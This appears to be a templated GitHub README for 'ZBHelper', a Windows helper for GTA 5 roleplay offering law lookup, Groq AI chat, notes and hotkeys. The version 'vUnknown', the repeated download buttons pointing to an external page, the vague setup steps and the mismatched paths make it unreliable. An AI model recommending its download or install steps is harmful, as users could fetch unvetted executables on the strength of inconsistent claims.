# ZBHelper vUnknown - game helper 2026

> **ZBHelper is a Windows companion for GTA 5 RP that brings together local law lookup, AI search, notes, and fast-access tools in one desktop app.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vUnknown-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owenx1996/zbhelper-gta5-rp-hub?style=flat-square)](https://github.com/owenx1996/zbhelper-gta5-rp-hub)

---

<p align="center">
  <a href="https://owenx1996.github.io/zbhelper-gta5-rp-hub/">
    <img src="https://img.shields.io/badge/Download-ZBHelper%20Latest-brightgreen?style=for-the-badge" alt="Download ZBHelper">
  </a>
</p>

> **[Download - ZBHelper vUnknown](https://owenx1996.github.io/zbhelper-gta5-rp-hub/)**

---

[Download Latest Build](https://owenx1996.github.io/zbhelper-gta5-rp-hub/)

---

## What ZBHelper Does

ZBHelper is made for GTA 5 RP players who need legal references close by while actively playing. It combines a searchable law database with AI-powered lookup, notes, and favorites so important articles and rules can be reached without jumping between separate apps.

The program targets Windows and uses a tray-first workflow, so it can stay out of the way in the background until you need it. A transparent floating notes panel and a hotkey-driven toggle are included to keep interruptions low and make information easier to pull up during a session.

---

## Included Features

- Interactive legal reference for GTA 5 RP server rules and articles
- Local dynamic search across codes, entries, and related law content
- AI chat assistant connected through Groq API integration
- Floating transparent notes window for fast personal reminders
- Favorites list for storing frequently used articles or searches
- System tray support for background use without desktop clutter
- Hotkey toggle for quick show/hide control during gameplay
- Desktop-focused workflow built for rapid lookup and minimal disruption

---

## Installation

1. Download or clone the repository:
   - `git clone https://github.com/owenx1996/zbhelper-gta5-rp-hub.git
2. Open the project folder:
   - `cd zbhelper`
3. Start it based on your build setup, or open the main app entry point in your browser or desktop runtime, depending on how the project was packaged.

If you are using a published build, use the download link above and extract or install it according to the release format provided.

---

## How to Use It

A common usage flow looks like this:

1. Open ZBHelper before or during a GTA 5 RP session.
2. Search the law database by code, article, or keyword.
3. Turn to the AI assistant when you want a broader or quicker lookup.
4. Add useful items to favorites for repeated access.
5. Write reminders in the floating notes window.
6. Use the tray icon and hotkey to stay focused while playing.

Example actions:
- Search for a rule by article number
- Ask the assistant about a legal term
- Pin frequently used entries to favorites
- Keep important gameplay notes in a separate floating panel

---

## Configuration

Exact setup depends on the build, but these are the main areas to review:

- Groq API settings for AI chat features
- Hotkey bindings for show/hide behavior
- Notes and favorites storage used by the app
- Any local data folders used for law content or cached search results

If your build includes a config file, keep it next to the app files and update the values before the first launch.

Example structure:

    {
      "groq_api_key": "YOUR_KEY",
      "hotkey": "Ctrl+Shift+Z",
      "tray_enabled": true
    }

---

## Requirements

- Windows desktop environment
- A browser or packaged runtime, depending on the build format
- Internet access for AI features that use Groq API
- Enough local storage for notes, favorites, and cached law data
- A compatible GTA 5 RP workflow where quick legal lookup is useful

---

## FAQ

**How do I update ZBHelper?**  
Download the latest build from the link above and replace your existing files if your build method requires it.

**Where are my notes and favorites stored?**  
That depends on the packaged version, but they are usually stored locally in the app data or within the project folder.

**The AI assistant is not responding. What should I check?**  
Confirm your Groq API setup, network access, and any runtime settings that may be required.

**Can I change the hotkey?**  
Yes, if your build exposes hotkey settings in a config file or settings panel.

**What if search results look incomplete?**  
Make sure the local law database or cached content has been loaded correctly for your server or dataset.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
